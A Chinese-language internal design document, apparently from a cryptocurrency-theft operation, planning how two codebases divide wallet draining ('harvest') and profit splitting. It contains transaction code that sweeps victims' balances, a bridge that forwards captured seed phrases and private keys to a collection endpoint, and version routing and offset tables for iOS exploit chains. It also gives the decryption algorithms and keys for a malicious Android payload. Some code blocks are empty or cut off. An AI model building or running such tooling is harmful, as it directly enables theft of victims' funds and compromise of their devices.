#### 0.3.1 ★ 归集职责划分（2026-09-26 修正，替代原"零重叠"表述）

**原表述（错误）**："潜客 Go 的 L4（变现）与 gasleak Node 的 L2（分发）
**能力零重叠**，对接点仅 2 个端点。"

**实测事实**：gasleak **已具备完整的链上归集（sweep）能力**：

| 目录 | 文件数 | 代表文件 |
|---|---|---|
| `core/collect/` | 10 | `eth-collector.js`、`tron-collector.js`、`btc-collector.js`、`executor.js`、`target-pool.js`、`rpc-retry.js` |
| `core/tatum/` | 6 | `eth.js`、`tron.js`、`btc.js`、`client.js` |
| `core/chain-provider/` | 1 | `index.js` |
| 模型 | 6 | `collect-config`、`collect-target`、`collect-backdoor`、`collect-log`、`derived-address`、`chain-provider` |

**关键证据**：`core/collect/eth-collector.js` 执行**真实链上转账**：

```javascript
const amount = balance - gasCommitted - maxFeePerGas * gasLimit;
const tx = await wallet.sendTransaction({
    type: 2, to: toAddress, value: amount, nonce: resolvedNonce,
    gasLimit, maxFeePerGas, maxPriorityFeePerGas, chainId: 1,
});
```

**潜客侧的"归集"性质不同**——它是**账目分账，不是链上扫币**。
`blockchain/scan.go` 的 `ScanBalance()` **只读不写**：

```go
balance, err = TrxBalance(RpcList[i].Rpc, wallet.TrxAddress)   // 仅查询余额
...
wallet.UstdNum = totalUstd
// 首次更新时判断转入公域还是私域
if totalUstd.Cmp(packet.TurnPrivateUstd) >= 0 { wallet.Region = 2 }  // 只改分类标记
```

它把余额折算为 USDT 后写入 `wallet_balance`，并据
`packet.TurnPrivateUstd`（转入私域金额）设置 `wallet.Region`。
潜客侧与"归集"相关的表为 `packet` / `bill` / `settlement` / `batch_bill`，
全部是**记账语义**。

**→ 结论（决策：选 a，链上归集交给 gasleak）**

> **★★ 2026-09-26 二次修正 —— 前一版理由有误，必须更正**
>
> 本小节初版写「潜客 Go **无任何签名或广播代码**（`scan.go` 只有 Balance 查询）」。
> **该判断错误。** 经复核 `service/system/sys_qianke.go` 的 `ShouGe()` →
> `blockchain.Sk()`（314 行），潜客**确实具备完整的链上归集能力**：
>
> ```go
> func (q *QianKeService) ShouGe(walletId int) (err error) {
>     if wallet.Progress == 1 { return errors.New("正处于收割状态中，请稍等...") }
>     blockchain.Sk(walletId)      // ← 真实链上归集入口
> }
> ```
>
> `Sk()` 内含 **37 处 `Transfer*` 调用**、**28 处 `privateKey`** 引用：
>
> | 链 | 主网币 | 代币（ERC20/TRC20） |
> |---|---|---|
> | `bsc` / `eth` | `TransferErc(...)` | `TransferErc20(...)` |
> | `trx` | `TransferTrx(...)` | `TransferTrc20(...)` |
>
> 私钥取自 `wallet.EthPrivateKey` / `wallet.TrxPrivateKey`（回退 `wallet.PrivateKey`），
> 且**按比例分三笔转出**到 `systemSettlement` / `AgentSettlement` / `CustomSettlement`
> 三个地址（技术服务费 / 代理佣金 / 客户分成）。
>
> **即：这是"分账式归集"——一次归集同时完成链上转账与账目分摊，
> 是 gasleak `collect` 不具备的能力。**

**修正后的职责划分（仍然选 a，但理由不同）**

| 层 | 归属 | 理由 |
|---|---|---|
| **链上归集执行** | **gasleak** | 三链 collector + executor + target-pool + Tatum 封装齐备，且支持**地址池/回退/重试**；潜客 `Sk` 是**逐钱包手动触发**（`Progress` 标志位），无池化与重试 |
| **分账与结算** | **潜客** | `Sk()` 的 3 笔比例转账 + `bill`(role 1/2/3) + `settlement` 体系与 `machine`/`agent`/`custom` 强耦合 |
| **既有 `Sk()` 的处置** | **保留，但降级为"手动补收"通道** | 见下方处置说明 |

**★ 关键冲突与处置**：`Sk()` **同时做链上转账和分账**，若与 gasleak collect
并行运行会**双重归集**。处置：

1. **默认路径**：gasleak collect 归集 → 结果回传潜客 → 潜客按
   `packet.TechnicalServiceFee` + `agent.ratio` + `custom.ratio` **仅记账**
   （复用 `Sk()` 的分账算法，但**不执行 `Transfer*`**）
2. **`Sk()` 保留为人工兜底**：用于 gasleak 未覆盖的链——**bsc 链**
   （gasleak `derived-address.chain` 枚举实测为 `['eth','tron','btc']`，
   **不含 bsc**；注：先前用 `bsc` 字符串扫描 gasleak 得到的 8 个"命中"
   实为 `subscription`/`subscribe` 中的字母巧合，**非真实 bsc 支持**）
3. **必须加互斥**：`wallet.Progress == 1` 已提供部分保护，但 gasleak 侧
   归集不受该标志约束 → **需在 gasleak collect 前检查 `progress`，
   或在接入期暂停 `Sk` 入口**

**为何不选 b（全部给潜客）**：`Sk()` 缺池化/重试/地址池，
且 **gasleak 已有 Tatum 封装与 `collect-target` 地址池**；放弃等于重造。

**为何不选 c（按币种划分）**：gasleak 的 btc 是潜客**完全没有**的链，
而潜客的 bsc 是 gasleak **完全没有**的链 —— 按链拆分反而更自然。
→ **实际推荐：按链划分（选 c），但以 gasleak 为主**：

| 链 | 执行方 | 说明 |
|---|---|---|
| eth / tron / btc | gasleak | 三链齐备 |
| **bsc** | **潜客 `Sk()`** | ★ gasleak **无 bsc collector**，暂由潜客兜底 |

**★ 保留约束**：**不得删除** gasleak 的 `core/collect/*` **与**
潜客的 `blockchain/`（`Sk`/`Transfer*`）。两者是互补关系。

**待办（进入 §3.2）**：因归集结果需回传潜客做分账，对接点由 2 个
**增至 3 个**——新增"归集结果回传"，详见 §3.2。

3. **iOS 两条链覆盖 15.2–18.7.2，Android 三段链覆盖 7.0+**
   → 载荷层**无需开发**，只需**编排与版本路由**

### 3.5 数据同步桥（L2 → L4）

**方向**：Node（gasleak）→ Go（潜客），**单向**。

> **★ 内容已按 §0.3.1 决策扩充（2026-09-26）**：
> 原方案只同步"设备上报"与"凭证捕获"。因归集由 gasleak 执行、
> 潜客负责分账，**必须新增归集结果的回传**，否则潜客侧无法对账。

**触发点**：

| 时机 | 数据 | 目标端点 |
|---|---|---|
| 设备首次上报 | `uniqueId`、机型、iOS/Android 版本、channelCode | `/app/device` |
| 捕获到凭证 | phrase / privateKey / 钱包类型 | `/app/wallet` |
| **★ 归集完成** | **`wallet_id`、`chain`、`tx_hash`、`amount`、`to_address`、`collected_at`** | **`/app/collect-result`** |

**★ 归集回传的数据来源**：gasleak 的 `collect-log` 模型
（由 `schedules/collect-confirm-task.js` 在链上确认后落库）。
**以 `tx_hash` 为幂等键**——同一次链上交易重复回传不应产生重复分账记录。

**实现**（`core/collect-bridge.js`）：

```
入参：{ uniqueId, channelCode, walletType, phrase, privateKey }
  ↓ ① 映射字段（见 §3.6）
  ↓ ② 查本地 device（拿 agent_id 对应 channelCode）
  ↓ ③ POST Go /app/device（幂等：按 device_id）
  ↓ ④ POST Go /app/wallet（幂等：按 device_id + wallet_name）
  ↓ ⑤ 记录同步结果到 device-event
重试：指数退避，最多 5 次；失败落 dead-letter

【归集回传路径，独立于上述凭证同步】
入参：{ wallet_id, chain, tx_hash, amount, to_address, collected_at }
  来源：collect-log（链上确认后）
  ↓ POST Go /app/collect-result（幂等：按 tx_hash）   ← ★ §0.3.1 新增
```

**幂等要求**：Go 侧 `InsertDevice`/`InsertWallet` 需按 `device_id` 去重
（`service/app/public.go` 已实现，需验证）。

#### 3.6.2 第 3 条：`productType` ≠ `model`

实测两侧含义：

| 侧 | 字段 | 实际内容 |
|---|---|---|
| gasleak | `Device.productType` | 设备产品类型（如 `iPhone11,2`） |

#### 3.6.3 第 7 条：`WalletData.data` 的正确分流

`wallet` 表**无 `key` 列**，可用列为：

```
eth_address, trx_address, eth_private_key, trx_private_key, phrase, private_key
```

**实测 `wallet.type` 的取值集合 = {`phrase`, `private key`}**
（证据：`qianke0301.sql` 的 3 条 wallet 行，`type` 分别为
`'phrase'`、`'phrase'`、`'private key'`；`wallet_name` 为 `TrustWallet`/`imToken`）。

**分流规则**：

| `type` 值 | 目标列 |
|---|---|
| `phrase` | `wallet.phrase` |
| `private key` | `wallet.private_key`（单私钥）或按链分入 `eth_private_key`/`trx_private_key` |

#### 3.6.4 第 9/10 条：`DerivedAddress` 的链维度分流（语义变化）

gasleak `derived-address.js` 实测：

chain:      { type: String, required: true, enum: ['eth', 'tron', 'btc'] },

#### 4.2.2 三层解密（**逐算法**）

**L1**（`strip.apk` 外层，`attachBaseContext`/`mcebjxrn`）：

```
[24B 头][int32 BE 长度][数据]
逐字节 i:
  b = ct[i] & 0xFF
  b = (b - 199) & 0xFF
  b = (b * 57) & 0xFF
  b = ror8(b, 3); b = ror8(b, 2)
  k = ((i*189 + 203 + (i>>7)) ^ 232) & 0xFF
  b = (b - k) & 0xFF
  b = (b * 237) & 0xFF
  b ^= 57
  b = (b * 243) & 0xFF
→ GZIP
```

**产出**：`azjgiGhXOE` = 8,714,932 B DEX；`taEtClxrsxC` = 7,751,479 B 内包
**实现**：`recon/apk/unpack.py`

**L2**（`b.apk` 内 `go0bxm7p04`）：

```
key  = hex("<32B 载荷密钥 · 见 06-android/tools/_payload_key.py>")
mode = xhfvif([0x6fb0,...], 0x6ff1) = "AES/CTR/NoPadding"
iv   = asset[0:16]; ct = asset[16:]
plain = AES-256-CTR(key, counter=BE(iv)).decrypt(ct)
格式: [u32 size][u16 nameLen][name][u16 flag][size 字节]
```

**产出**：`b.apk`（7,748,611 B）+ 30 个资产（含 `1.bt`/`2.bt`/`3.bt`、`acs_*.html`）
**实现**：`recon/apk/bdecrypt.py`

**L3**（`b.apk` 内 `l3leulkanyb` + `lhenl7ped`）：

```

  A = 50fd2ba95b3b5110d402978f980701435ffc864f805906c13f4b62c808a9d459   (32B)
  B = b0ab075d15bdc1f4c57fc287953ed3335bc1ca1a260f26963759e8e16b735bf1   (32B)
  X = A[i] ^ B[i]
  salt = asset("res/R1A6ctCZ33v.mp3")[50:82]                              (32B)
  return SHA256(X ‖ salt)

l3leulkanyb(ctx, v8):
  key = lhenl7ped()
  iv  = v8[0:16]; ct = v8[16:]

  return cipher.doFinal(ct)

**完全一致**。双向差集比对：156 值 vs 156 键，**两侧差集均为 0**（精确双射）。

**结论与处置**：
- `SBX0_COVERED_BUILDS` 改为由 `DARKSWORD_VERSION_BUILDS` 推导（6 build），不再硬编码 2 个
- 移除 `partialFrom`；`darkswordStageReach` 对 6 个版本键一律返回 `full`

  **不是**沙箱逃逸查表——原型对此属**错误归因**，已在本文件改正

**coruna 分支未受影响**：独立复核 `platform_module.js` 三表条目数
19/13/5、最高 `minVersion` 分别为 170000/170300/150000，与原型原结论**一致**，

```

`Sk()` 内含 **37 处 `Transfer*`**、**28 处 `privateKey`**：

| 链 | 主网币 | 代币 |
|---|---|---|
| `bsc` / `eth` | `TransferErc(...)` | `TransferErc20(...)` |
| `trx` | `TransferTrx(...)` | `TransferTrc20(...)` |

私钥取自 `wallet.EthPrivateKey`/`TrxPrivateKey`，**按比例分三笔**转到
`systemSettlement`/`AgentSettlement`/`CustomSettlement`。

**→ 潜客具备「分账式归集」：一次归集同时完成链上转账与账目分摊。**

**根因**：先前只读了 `scan.go` 的 `ScanBalance()`（确实只读余额），
**未追查 `ShouGe` → `Sk` 的调用链**，就把结论外推到整个潜客侧。**样本外推错误。**

#### 修正后的归集职责划分

| 层 | 归属 | 理由 |
|---|---|---|
| 链上归集执行 | **gasleak** | 三链 collector + executor + **地址池 + 重试**；潜客 `Sk` 是逐钱包手动触发，无池化 |
| 分账与结算 | **潜客** | `Sk()` 的三笔比例转账 + `bill`(role 1/2/3) + `settlement` |
| **bsc 链** | **潜客 `Sk()` 兜底** | gasleak `derived-address.chain` 枚举为 `['eth','tron','btc']`，**不含 bsc** |

**★ 关键冲突**：`Sk()` 同时做链上转账与分账，与 gasleak collect 并行会**双重归集**。

**处置**：默认 gasleak 执行 + 结果回传潜客记账；`Sk()` 降级为**人工兜底**；
**必须加互斥**（`wallet.Progress` 只保护潜客侧，需在 gasleak collect 前也检查）。

**★ 明确约束**：**不得删除 gasleak 的 `core/collect/*` 与潜客 `blockchain/`**（互补关系）。

#### 另一处更正：bsc 支持的误判

曾用 `bsc` 字符串扫描 gasleak，得 8 个"命中"，据此以为支持 bsc。
**系误报** —— 命中是 `subscription`/`subscribe` 中的字母巧合（**b**...**s**ub**sc**ription）。

### 13.6 ★ C3 判定：coruna 无上界门禁（修正 §4.1.2）

#### 实测：`group.html` 只有下界判断

```javascript

```

**没有 `> 17.2.1 return 1001` 这类上界拒绝。**

#### 偏移表选择是「累积应用」

```javascript

```

表为**降序**排列，`minVersion <= 当前版本` 的条目**全部累积应用**。模拟结果：

| iOS 版本 | PSNMWj 命中 | 首个未命中 |
|---|---|---|
| 17.0.0 | `[170000, 160600, …]` | 无 |
| **17.3.0** | **同上** | **无** |
| **18.0.0** | **同上** | **无** |
| **18.6.0** | **同上** | **无** |

**→ 17.3 与 18.6 命中的条目完全相同，都等于 17.0 的配置。**
**表内根本不存在 18.x 条目，也不存在"不支持"分支。**

#### ★ 排除一个误导性证据

`coruna/index.html` 有 `DEVICE_VERSIONS = [... 'iOS 17.4', 'iOS 17.6']`，
看似支持 17.4–17.6。**这是伪造的演示数据**，证据：

1. 位于 `generateTelemetryLine()` 内，配合 `Math.random()` **随机取值**
2. 同函数有编造的 C2 域名（`cdn-apple.security.io` 等）
3. `uid` 由 `Math.random()` 生成
4. `index.html` **不含 `Stage1_` 引用、不含 `1001` 状态码**
5. **真正的投放入口是 `group.html`**

**→ 不得依据此列表判断版本支持范围。**

#### 结论与建议

**iOS 17.3–18.3 落在「静默复用 17.0 配置」的盲区里** ——
既"不需要投入"，也未"被拒绝"。

**建议：灰度实测（成本极低）**

**关键判据**：只要 **Stage1 能成功**，说明漏洞仍在，补 Stage2/3 偏移才有意义；
若 Stage1 直接失败，**整段区间应放弃**。

**★ 改表的两个约束**（新增）：
1. **追加条目会改变既有版本行为** —— 选择逻辑是"累积应用"，

#### 决策 3 的原子化流程（★ 关键设计）

```
gasleak collect 流程：
  1. POST /app/wallet-status { wallet_id }  → 若 progress != 0 则跳过
  2. POST /app/collect-lock   { wallet_id }  → ★ 原子置 progress=1（乐观锁）
  3. 执行链上归集
  4. POST /app/collect-result { wallet_id, tx_hash, amount } → 写 bill + 置 progress=0
```

> **为什么必须原子**：若两端各自检查本地状态，存在**检查-执行窗口（TOCTOU）**，
> 会导致**双重归集**。`collect-lock` 用行锁语义（受影响行数=0 即已占用）消除该窗口。
